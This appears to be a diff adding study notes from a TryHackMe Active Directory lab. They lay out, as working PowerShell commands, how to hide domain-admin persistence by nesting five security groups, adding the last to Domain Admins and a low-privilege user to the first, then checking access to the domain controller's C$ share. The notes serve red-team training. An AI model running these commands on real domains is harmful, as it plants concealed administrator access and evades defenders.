@@ -1,0 +1,51 @@
+Sometimes, the highest group / membership is not the best one for persistence.
+It's where all the security lies, so why not go somewhere else?
+Maybe a bit lower?
+
+For example, a nested group!
+Take a group like a local IT support group. There are loads of nested
+groups within a big organisation. Pick one, and add yourself!
+
+Help desk, access card manangers, network managers. Loads of groups.
+
+For example, we can make a new group within People > IT Organisational Unit (OU)
+New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
+
+Then, we can create another group inside of people > sales ou and then add 
+our previous group as a member to it:
+New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 
+Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
+
+
+We could then add them to more, and more nesting groups. Just keep on stacking, stacking, stacking.
+New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 3" -SamAccountName "<username>_nestgroup3" -DisplayName "<username> Nest Group 3" -GroupScope Global -GroupCategory Security
+Add-ADGroupMember -Identity "<username>_nestgroup3" -Members "<username>_nestgroup2"
+New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 4" -SamAccountName "<username>_nestgroup4" -DisplayName "<username> Nest Group 4" -GroupScope Global -GroupCategory Security
+Add-ADGroupMember -Identity "<username>_nestgroup4" -Members "<username>_nestgroup3"
+New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 5" -SamAccountName "<username>_nestgroup5" -DisplayName "<username> Nest Group 5" -GroupScope Global -GroupCategory Security
+Add-ADGroupMember -Identity "<username>_nestgroup5" -Members "<username>_nestgroup4"
+
+Now, with our last group, we can add that to our Domain Admins group:
+Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
+
+Now, we can add our low privilege AD user to the first group we created:
+Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
+
+Now, your AD User should have the privilege to access to the Domain Controller.
+Check with the following command:
+dir \\thmdc.za.tryhackme.loc\c$\ 
+
+We can also check that even though we have a load of groups, the domain admins group
+only has one new member:
+Get-ADGroupMember -Identity "Domain Admins"
+
+If this was a real organisation, we would not be creating new groups to nest.
+We would be making use of the existing groups, and chaining them together
+to perform nesting.
+
+This is something that is never normally done within a red team assessment
+because it ends up breaking the Organisation's AD structure, and can be
+super annoying and can end up in a full Domain Rebuild.
+
+It's just adding a member to the first group, then adding the first group
+to the second group, etc etc. Very funny, and very annoying.
